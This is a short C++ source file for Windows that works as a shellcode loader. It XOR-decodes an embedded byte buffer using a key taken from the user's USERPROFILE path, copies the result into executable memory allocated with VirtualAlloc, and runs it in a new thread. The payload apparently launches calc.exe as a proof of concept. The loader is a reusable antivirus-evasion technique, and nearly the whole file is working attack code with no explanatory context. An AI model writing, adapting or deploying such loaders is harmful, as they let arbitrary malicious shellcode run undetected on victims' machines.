

#include <cstdint>
#include <iostream>
#include <windows.h>



int main()
{
	unsigned char buf[] =
	"\xf6\x42\x89\xee\xfa\xe2\xca\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x58\x5b"
	"\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58"
	"\x2a\x42\x81\x78\x5a\x42\x05\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca"
	"\xa6\x36\x6b\x76\x08\x26\x2a\x4b\xcb\xc3\x07\x4b\x0b\xcb\xe8\xe7"
	"\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\x0b\xda\x81\x8a\x82"
	"\x0a\x0a\x0a\x42\x8f\xca\x7e\x6d\x42\x0b\xda\x5a\x81\x42\x12\x4e"
	"\x81\x4a\x2a\x43\x0b\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42"
	"\x0b\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x07\x4b\x0b\xcb"
	"\x32\xea\x7f\xfb\x46\x09\x46\x2e\x02\x4f\x33\xdb\x7f\xd2\x52\x4e"
	"\x81\x4a\x2e\x43\x0b\xda\x6c\x4b\x81\x06\x42\x4e\x81\x4a\x16\x43"
	"\x0b\xda\x4b\x81\x0e\x82\x42\x0b\xda\x4b\x52\x4b\x52\x54\x53\x50"
	"\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b"
	"\x53\x50\x42\x81\x18\xe3\x5d\xf5\xf5\xf5\x57\x42\xb0\x0b\x0a\x0a"
	"\x0a\x0a\x0a\x0a\x0a\x42\x87\x87\x0b\x0b\x0a\x0a\x4b\xb0\x3b\x81"
	"\x65\x8d\xf5\xdf\xb1\xea\x17\x20\x00\x4b\xb0\xac\x9f\xb7\x97\xf5"
	"\xdf\x42\x89\xce\x22\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d"
	"\x19\x78\x65\x60\x0a\x53\x4b\x83\xd0\xf5\xdf\x69\x6b\x66\x69\x24"
	"\x6f\x72\x6f\x0a";

	const std::string USERPROFILE = getenv("USERPROFILE");
	const std::uint8_t key = static_cast<std::uint8_t>(USERPROFILE[0]) - 57;

	for (unsigned char & i : buf) {
		i ^= key;
	}

	void*  exec = VirtualAlloc(nullptr, sizeof(buf),	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, buf, sizeof(buf));

	const HANDLE hThread = CreateThread(nullptr, 0,
		(LPTHREAD_START_ROUTINE)exec,
		nullptr, 0, nullptr);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	return 0;
}